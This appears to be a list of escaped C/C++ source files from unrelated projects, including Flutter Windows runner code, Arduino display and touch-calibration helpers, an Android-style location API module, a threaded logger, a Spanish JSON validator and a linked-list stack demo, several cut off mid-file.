    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <Arduino.h>\n#include <LovyanGFX.hpp>\n#include \"lgfx_ESP32_2432S028.h\"\n#include <SPI.h>\n\nusing Action = void(&)(LGFX &lcd);\n\nvoid nop(LGFX &lcd){};\n\nvoid calibrateTouchPad(LGFX &lcd)\n  {\n    lcd.fillScreen(TFT_BLACK);\n    lcd.setTextSize((std::max(lcd.width(), lcd.height()) + 255) >> 8);\n\n    //if (lcd.width() < lcd.height()) lcd.setRotation(lcd.getRotation() ^ 1);\n\n    // Draws guidance text on the screen\n    lcd.setTextDatum(textdatum_t::middle_center);\n    lcd.setTextSize(1.0);\n    lcd.drawString(\"touch the arrow marker\", lcd.width()>>1, lcd.height() >> 1);\n    lcd.setTextDatum(textdatum_t::top_left);\n\n    // When using touch, perform calibration. Touch the tips of the arrows \n    // that appear in the four corners of the screen in sequence.\n    uint16_t fg = TFT_WHITE;\n    uint16_t bg = TFT_BLACK;\n    if (lcd.isEPD()) std::swap(fg, bg);\n    uint16_t caldata[8];\n    lcd.calibrateTouch(caldata, fg, bg, std::max(lcd.width(), lcd.height()) >> 3);\n    //lcd.calibrateTouch(nullptr, fg, bg, 20);\n    Serial.printf(R\"(\nRaw Touch Values\n----------------\nx0 = %4d y0 =%4d\nx1 = %4d y1 =%4d\nx2 = %4d y2 =%4d\nx3 = %4d y3 =%4d \n)\", caldata[0], caldata[1], caldata[2], caldata[3], \n    caldata[4], caldata[5], caldata[6], caldata[7]);\n    \n    log_e(\"==> done\");\n  }\n\n\n/**\n * Draw a framed crosshair in portrait orientation\n*/\nvoid framedCrosshair(LGFX &lcd)\n{\n  char str[24]; \n  lcd.fillScreen(TFT_BLACK);\n  lcd.drawRect(0,0, lcd.width(), lcd.height(), TFT_RED);\n  lcd.drawLine(0,0, lcd.width(), lcd.height(), TFT_GREEN);\n  lcd.drawLine(lcd.width(),0, 0, lcd.height(), TFT_BLUE);\n  lcd.fillRect(0,0, 20, 20, TFT_GREEN);\n  lcd.fillRect(lcd.width()-10,lcd.height()-10, 10, 10, TFT_RED);;\n  lcd.setTextSize(1.0);\n  sprintf(str, \"(0,0) origin, rot=%d\", lcd.getRotation());\n  lcd.drawString(str, 25,0);\n}\n\n/**\n * Draw a grid 20 x 20 \n*/\nvoid grid(LGFX &lcd)\n{\n  int x = 0, y = 0, d = 20;\n  lcd.fillScreen(TFT_BLACK);\n  while (y < lcd.height())\n  {\n    lcd.drawLine(0, y, lcd.width(), y, TFT_WHITE);\n    y += d;\n  }\n\n  while (x < lcd.width())\n  {\n    lcd.drawLine(x, 0, x, lcd.height(), TFT_WHITE);\n    x += d;\n  }\n  \n}\n\n/**\n * Show some facts about the display\n*/\nvoid lcdInfo(LGFX &lcd)\n{\n  Serial.printf(R\"(\nLCD Info\n--------\nwidth x height = %d x %d \nrotation       = %d \ncolor depth    = %d \ntext size X    = %4.2f\ntext size Y    = %4.2f\n)\", lcd.width(), lcd.height(), lcd.getRotation(), lcd.getColorDepth(),\n    lcd.getTextSizeX(), lcd.getTextSizeY());\n  Serial.printf(\"\\n\");\n}\n\n\nGFXfont defaultFont = fonts::DejaVu18;\n\n/**\n * Initialize display and call the greeting function.\n * The default for greeting is nop(). To calibrate the \n * touchscreen call it as initDisplay(lcd, calibrateTouchScreen).\n * The greeting function takes as argument the passed lcd\n*/\nvoid initDisplay(LGFX &lcd, uint8_t rotation=0, GFXfont *theFont=&defaultFont, Action greet=nop)\n  {\n    lcd.begin() ? log_i(\"--> done\") : log_i(\"--> failed\");\n    lcd.clear();\n    lcd.setTextSize(1.0);\n    lcd.setTextDatum(lgfx::textdatum::TL_DATUM);\n    lcd.setFont(theFont);\n    lcd.setRotation(rotation);\n    lcd.setBrightness(255);\n    greet(lcd);\n    log_i(\"==> done\");\n  }\n",
    "/* Copyright (c) 2017-2020 The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n#define LOG_NDEBUG 0\n#define LOG_TAG \"LocSvc_LocationAPI\"\n\n#include <location_interface.h>\n#include <dlfcn.h>\n#include <loc_pla.h>\n#include <log_util.h>\n#include <pthread.h>\n#include <map>\n#include <loc_misc_utils.h>\n\ntypedef const GnssInterface* (getGnssInterface)();\ntypedef const GeofenceInterface* (getGeofenceInterface)();\ntypedef const BatchingInterface* (getBatchingInterface)();\ntypedef void (createOSFramework)();\ntypedef void (destroyOSFramework)();\n\n// GTP services\ntypedef uint32_t (setOptInStatusGetter)(bool userConsent, responseCallback* callback);\ntypedef void (enableProviderGetter)();\ntypedef void (disableProviderGetter)();\ntypedef void (getSingleNetworkLocationGetter)(trackingCallback* callback);\ntypedef void (stopNetworkLocationGetter)(trackingCallback* callback);\n\ntypedef struct {\n    // bit mask of the adpaters that we need to wait for the removeClientCompleteCallback\n    // before we invoke the registered locationApiDestroyCompleteCallback\n    LocationAdapterTypeMask waitAdapterMask;\n    locationApiDestroyCompleteCallback destroyCompleteCb;\n} LocationAPIDestroyCbData;\n\n// This is the map for the client that has requested destroy with\n// destroy callback provided.\ntypedef std::map<LocationAPI*, LocationAPIDestroyCbData>\n    LocationClientDestroyCbMap;\n\ntypedef std::map<LocationAPI*, LocationCallbacks> LocationClientMap;\ntypedef struct {\n    LocationClientMap clientData;\n    LocationClientDestroyCbMap destroyClientData;\n    LocationControlAPI* controlAPI;\n    LocationControlCallbacks controlCallbacks;\n    GnssInterface* gnssInterface;\n    GeofenceInterface* geofenceInterface;\n    BatchingInterface* batchingInterface;\n} LocationAPIData;\n\nstatic LocationAPIData gData = {};\nstatic pthread_mutex_t gDataMutex = PTHREAD_MUTEX_INITIALIZER;\nstatic bool gGnssLoadFailed = false;\nstatic bool gBatchingLoadFailed = false;\nstatic bool gGeofenceLoadFailed = false;\nstatic uint32_t gOSFrameworkRefCount = 0;\n\ntemplate <typename T1, typename T2>\nstatic const T1* loadLocationInterface(const char* library, const char* name) {\n    void* libhandle = nullptr;\n    T2* getter = (T2*)dlGetSymFromLib(libhandle, library, name);\n    if (nullptr == getter) {\n        return (const T1*) getter;\n    }else {\n        return (*getter)();\n    }\n}\n\nstatic void createOSFrameworkInstance() {\n    void* libHandle = nullptr;\n    createOSFramework* getter = (createOSFramework*)dlGetSymFromLib(libHandle,\n            \"liblocationservice_glue.so\", \"createOSFramework\");\n    if (getter != nullptr) {\n        (*getter)();\n    } else {\n        LOC_LOGe(\"dlGetSymFromLib failed for liblocationservice_glue.so\");\n    }\n}\n\nstatic void destroyOSFrameworkInstance() {\n    void* libHandle = nullptr;\n    destroyOSFramework* getter = (destroyOSFramework*)dlGetSymFromLib(libHandle,\n            \"liblocationservice_glue.so\", \"destroyOSFramework\");\n    if (getter != nullptr) {\n        (*getter)();\n    } else {\n        LOC_LOGe(\"dlGetSymFromLib failed for liblocationservice_glue.so\");\n    }\n}\n\nstatic bool needsGnssTrackingInfo(LocationCallbacks& locationCallbacks)\n{\n    return (locationCallbacks.gnssLocationInfoCb != nullptr ||\n            locationCallbacks.engineLocationsInfoCb != nullptr ||\n            locationCallbacks.gnssSvCb != nullptr ||\n            locationCallbacks.gnssNmeaCb != nullptr ||\n            locationCallbacks.gnssDataCb != nullptr ||\n            locationCallbacks.gnssMeasurements",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "//\n// Created by Rikkual on 2024/4/15.\n//\n\n#include \"config.h\"\n\nconst int FLOOR = 9;                        // \u7535\u68af\u7684\u603b\u697c\u5c42\u6570\nconst int INIT_FLOOR = 1;                   // \u7535\u68af\u7684\u8d77\u59cb\u697c\u5c42\n\nconst bool COUT_ANIMATION = true;           // \u662f\u5426\u542f\u52a8\u8f93\u51fa&\u5220\u9664\u52a8\u753b\u6548\u679c\nconst int ANIMATION_SPEED = 20;             // \u52a8\u753b\u901f\u5ea6\uff0c\u5355\u4f4d\u4e3a\u6beb\u79d2\nconst int DELETE_LINE_LENGTH = 60;          // \u5220\u9664\u5355\u884c\u7684\u6700\u5927\u957f\u5ea6\nconst int DEVISIONLINE_LENGTH = 32;         // \u5206\u5272\u7ebf\u7684\u957f\u5ea6\n\nconst int ABOUT_X = 38;                     // \u5173\u4e8e\u83dc\u5355\u7684X\u5750\u6807\nconst int ABOUT_Y = 3;                      // \u5173\u4e8e\u83dc\u5355\u7684Y\u5750\u6807\nconst int INTERACT_X = 45;                  // \u4ea4\u4e92\u83dc\u5355\u7684X\u5750\u6807\nconst int INTERACT_Y = 2;                   // \u4ea4\u4e92\u83dc\u5355\u7684Y\u5750\u6807\n\nconst int FLOOR_DISPLAY_X = 32;             // \u7535\u68af\u697c\u5c42\u663e\u793a\u7684X\u5750\u6807\nconst int FLOOR_DISPLAY_Y = 10;             // \u7535\u68af\u697c\u5c42\u663e\u793a\u7684Y\u5750\u6807\nconst int ELEVATOR_SPEED = 800;             // \u7535\u68af\u8fd0\u884c\u7684\u901f\u5ea6\uff0c\u5355\u4f4d\u4e3a\u6beb\u79d2/\u5c42\u7684\u5355\u4f4d\u65f6\u95f4\nconst int DOOR_SPEED = 80;                  // \u7535\u68af\u95e8\u7684\u901f\u5ea6\uff0c\u5355\u4f4d\u4e3a\u6beb\u79d2/\u683c\nconst int ELEVATOR_SPEED_CNT = 2;           // \u7535\u68af\u8fd0\u884c\u7684\u901f\u5ea6\u5206\u7ea7\n\nconst bool CLEAR_LOG_FILE = true;           // \u662f\u5426\u5728\u542f\u52a8\u524d\u6e05\u7a7alog\u6587\u4ef6\nconst bool LOG_TIME = true;                 // \u662f\u5426\u5728log\u6587\u4ef6\u4e2d\u8bb0\u5f55\u65f6\u95f4\n\n",
    "\n/**\n * @file\t\tlogger.cpp\n * @brief       multi thread logger\n * @author  \tJeong Hoon (Sian) Choi\n * @version \t1.0.0\n * @date\t\t2024-05-13\n */\n\n#include \"sian/logger.h\"\n\n/* C & CPP */\n/*\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n*/\n\n#if _TARGET_OS == OS_WINDOWS\n\n#elif _TARGET_OS == OS_LINUX\n\n/* Definition */\n\n/* ASM codes */\n/*\nasm(R\"ASM(\n  ; assembly code x86-64 AT&T(fastcall-cdecl)\nfunc:\n  .cfi_startproc\n        pushq %rbp\n        .cfi_def_cfa_offset 16\n        .cfi_offset 6, -16\n        movq %rsp, %rbp\n        .cfi_def_cfa_register 6\n        movl %edi, -4(%rbp)  ; %rdi -> %rsi -> %rdx -> %rcx ->\n        movl %esi, -8(%rbp)  ; %r8  -> %r9  -> stack\n; return value %eax\n        popq %rbp\n\t\t\t\t.cf_def_cfa 7, 8\n\t\t\t\tret\n\t\t\t\t.cfi_endproc\n)ASM\");\n*/\n\n/* Data structures definition - struct & class */\n\nsian::Logger::Logger(std::string_view path)\n\t: m_path(path.data()) {\n\tm_thread = std::thread{&Logger::thread_process, this};\n}\n\nsian::Logger::~Logger(void) {\n\t{\n\t\tstd::unique_lock lock(this->m_mutex);\n\t\tthis->m_exit = true;\n\t\tthis->m_cond_var.notify_all();\n\t\tlock.unlock();\n\t}\n\n\tthis->m_thread.join();\n}\n\nvoid sian::Logger::log(std::string_view entry) {\n\tstd::unique_lock lock(this->m_mutex);\n\n\tthis->m_queue.push(entry.data());\n\tm_cond_var.notify_all();\n\n\tlock.unlock();\n}\n\nvoid sian::Logger::thread_process(void) {\n\tstd::ofstream fp(this->m_path);\n\n\tif (fp.fail()) {\n\t\tstd::cerr << \"Failed to open file\" << std::endl;\n\t\treturn;\n\t}\n\n\tstd::unique_lock lock(this->m_mutex);\n\twhile (true) {\n\t\tif (!this->m_exit) {\n\t\t\tthis->m_cond_var.wait(lock);\n\t\t}\n\n\t\tlock.unlock();\n\t\twhile (true) {\n\t\t\tlock.lock();\n\t\t\tif (this->m_queue.empty()) {\n\t\t\t\tbreak;\n\t\t\t} else {\n\t\t\t\tfp << this->m_queue.front() << std::endl;\n\t\t\t\tthis->m_queue.pop();\n\t\t\t}\n\t\t\tlock.unlock();\n\t\t}\n\n\t\tif (this->m_exit) {\n\t\t\tbreak;\n\t\t}\n\t}\n}\n\n/* Functions declare */\n\n/*\n\nvoid swap(Sample& lhs, Sample& rhs) noexcept {\n\t// shallow copy\n    // using std::swap;\n}\n\n*/\n\n#endif // OS dependency\n\n/*\n#ifdef __cplusplus\n}\n#endif\n*/\n",
    "//  ---                  JSON validator                      ---\n//  ---  Este programa recibe un archivo .json de entrada.   ---\n//  ---  Verifica que est\u00e9 bien escrito el formato JSON.     ---\n//  ---  En caso de un error, imprime en cosola.             ---\n//  ---  Si es correcto crea dos archivos de salida.         ---\n//  ------------------------------------------------------------\n\n#include <iostream>\n#include <fstream>\n#include <stack>\n#include <queue>\n#include <string>\n\nusing namespace std;\n\nconst string NOMBRE_ARCHIVO_ENTRADA = \"entrada.json\";\n\nenum ModoAnalisis\n{\n    JSON,\n    LLAVE,\n    VALOR,\n    LISTA\n};\n\nclass ExpresionJSON\n{\nprivate:\n    stack<char> pila;\n    string buffers;\n\npublic:\n    void evaluarCaracter(char c, char nc, ModoAnalisis &modo, string buffer);\n    void imprimir(ofstream &archivoSalida) const;\n};\n\nclass ExpresionValor\n{\nprivate:\n    stack<char> pila;\n    string buffers;\n\npublic:\n    void evaluarCaracter(char c, char nc, ModoAnalisis &modo, string buffer);\n    void imprimir(ofstream &archivoSalida) const;\n};\n\nclass ExpresionLlave\n{\nprivate:\n    stack<char> pila;\n    string buffers;\n\npublic:\n    void evaluarCaracter(char c, char nc, ModoAnalisis &modo, string buffer);\n    void imprimir(ofstream &archivoSalida) const;\n};\n\nclass ExpresionLista\n{\nprivate:\n    stack<char> pila;\n    string buffers;\n\npublic:\n    void evaluarCaracter(char c, char nc, ModoAnalisis &modo, string buffer);\n    void imprimir(ofstream &archivoSalida) const;\n};\n\nvoid procesarArchivo(const string &nombreArchivo, const string &nombreArchivoSalida, const string &nombreBuffers, ExpresionJSON &expresionJSON, ExpresionValor &expresionValor, ExpresionLlave &expresionLlave, ExpresionLista &expresionLista);\n\nint main()\n{\n    string archivoEntrada = NOMBRE_ARCHIVO_ENTRADA;\n    string archivoSalida = \"salida.json\";\n    string buffers = \"buffers.txt\";\n\n    ExpresionJSON expresionJSON;\n    ExpresionValor expresionValor;\n    ExpresionLlave expresionLlave;\n    ExpresionLista expresionLista;\n\n    procesarArchivo(archivoEntrada, archivoSalida, buffers, expresionJSON, expresionValor, expresionLlave, expresionLista);\n\n    return 0;\n}\n\nvoid procesarArchivo(const string &nombreArchivo, const string &nombreArchivoSalida, const string &nombreBuffers, ExpresionJSON &expresionJSON, ExpresionValor &expresionValor, ExpresionLlave &expresionLlave, ExpresionLista &expresionLista)\n{\n    ifstream archivo(nombreArchivo);\n    ofstream archivoSalida(nombreArchivoSalida);\n    ofstream buffers(nombreBuffers);\n\n    if (!archivo)\n    {\n        cout << \"No se pudo abrir el archivo de entrada: \" << nombreArchivo << endl;\n        return;\n    }\n\n    cout << \"Se pudo abrir el archivo de entrada: \" << nombreArchivo << endl\n         << endl;\n\n    char c;\n    char nc;\n    string buffer; // Buffer global para almacenar los caracteres\n    ModoAnalisis modo = JSON;\n\n    while (archivo.get(c))\n    {\n        if (!isspace(c)) // omitir espacios\n        {\n            buffer += c;\n            while (isspace(archivo.peek()))\n            {\n                archivo.get(nc);\n            }\n            nc = archivo.peek(); // obtener el siguiente caracter sin ser un espacio\n            switch (modo)\n            {\n            case JSON:\n                expresionJSON.evaluarCaracter(c, nc, modo, buffer);\n                break;\n            case VALOR:\n                expresionValor.evaluarCaracter(c, nc, modo, buffer);\n                break;\n            case LISTA:\n                expresionLista.evaluarCaracter(c, nc, modo, buffer);\n                break;\n            case LLAVE:\n                expresionLlave.evaluarCaracter(c, nc, modo, buffer);\n                break;\n            }\n        }\n    }\n\n    expresionJSON.imprimir(buffers);\n    expresionValor.imprimir(buffers);\n    expresionLista.imprimir(buffers);\n    expresionLlave.imprimir(buffers);\n\n    archivoSalida << buffer; // Imprimir el buffer en el archivo de salida\n    archivoSalida.close();\n    archivo.close();\n    cout << \"Archivo JSON verificado con exito!\" << endl;\n}\n\nvoid ExpresionJSON::evaluarCaracter(char c, char nc, ModoAnalisis &modo, string buffer)\n{\n    if (pila.empty())\n    {\n        if (c == '{')\n        {\n            pila.push(c);\n            buffers += c;\n            modo = LLAVE;\n        }\n        else\n        {\n            cout << \"Error JSON: Car\u00e1cter inesperado antes de la apertura de llaves. El caracter erroneo fue: \" << c << endl;\n            cout << buffer << endl;\n            exit(1);\n        }\n    }\n    else\n    {\n        if (c == ',')\n        {\n            buffers += c;\n            if (nc == '\"')\n            {\n                modo = LLAVE;\n            }\n        }\n        else if (c == '{') // varias anidaciones\n        {\n            pila.push(c);\n            buffers += c;\n            modo = LLAVE;\n        }\n        else if (c == '}')\n        {\n            pila.pop();\n            buffers += c;\n        }\n        else\n        {\n            cout << \"Error JSON: Car\u00e1cter inesperado, se espera un",
    "#include <iostream>\nusing namespace std;\nstruct node\n{\n\tint Data;\n\tnode* next;\n};\n\n// global pointer\nnode* TOP = NULL;\nnode* current = NULL;\n\nbool isEmpty()\n{\n\tif (TOP == NULL)\n\t\treturn true;\n\telse\n\t\treturn false;\n}\nvoid push(int newdata)\n{\n\tnode* current = new node();\n\tcurrent->Data = newdata;\n\tif (!isEmpty())\n\t{\n\t\tcurrent->next = TOP;\n\t\tTOP = current;\n\t}\n\telse\n\t{\n\t\tTOP = current;\n\t\tTOP->next = NULL;\n\t}\n}\nvoid pop()\n{\n\tif (!isEmpty())\n\t{\n\t\tcurrent = TOP;\n\t\tTOP = TOP->next;\n\t\tdelete current;\n\t}\n\telse\n\t\tcout << \"No stack found\" << endl;\n}\nvoid popAll()\n{\n\twhile (!isEmpty())\n\t{\n\t\tcurrent = TOP;\n\t\tTOP = TOP->next;\n\t\tdelete current;\n\t}\n}\nvoid display()\n{\n\tif (!isEmpty())\n\t{\n\t\tcurrent = TOP;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\tcout << current->Data << endl;\n\t\t\tcurrent = current->next;\n\t\t}\n\t}\n\telse cout << \"There is no data in the Stack\\n\";\n}\nvoid app()\n{\n\t/*\n\t\top -> operation\n\t\tc -> confirm\n\t\tp -> push node\n\t\tao -> another operation\n\t\ts -> starter app\n\t*/\n\t\tint op, c, p, ao, s;\n\tcout << \"--- Welcome to stack implementation---\\n\";\n\tdo\n\t{\n\t\tcout << \"Choise what do you want\\n\";\n\t\tcout << \"Push -> (1)\\n\";\n\t\tcout << \"Pop an Elements -> (2) \\n\";\n\t\tcout << \"POP All Elements -> (3)\\n\";\n\t\tcout << \"Display -> (4)\\n\";\n\t\tcout << \"Exit -> (5)\\n\";\n\t\tcin >> op;\n\t\tswitch (op)\n\t\t{\n\t\tcase 1:\n\t\t\tcout << \"Enter value do you want to push \\n\";\n\t\t\tcin >> p;\n\t\t\tpush(p);\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tcout << \"Are you sure to pop one node\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tpop();\n\t\t\t\tcout << \"\\nCheck data of stack after poping first node : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Pop is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tcout << \"Are you sure to pop all nodes\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tpopAll ();\n\t\t\t\tcout << \"\\nCheck data of stack after poping all nodes : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Pop all is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tcout << \"Pushed Elements are:\\n\";\n\t\t\tdisplay();\n\t\t\tbreak;\n\t\tcase 5:\n\t\t\treturn;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tcout << \"Wrong Input Try Again\\n\";\n\t\t}\n\t\tcout << \"Do you want another opration\\n\";\n\t\tcout << \"Yes -> 1 \\n\";\n\t\tcout << \"NO -> any key \\n\";\n\t\tcin >> ao;\n\t} while (ao == 1);\n}\nint main()\n{\n\tapp();\n\treturn 0;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = 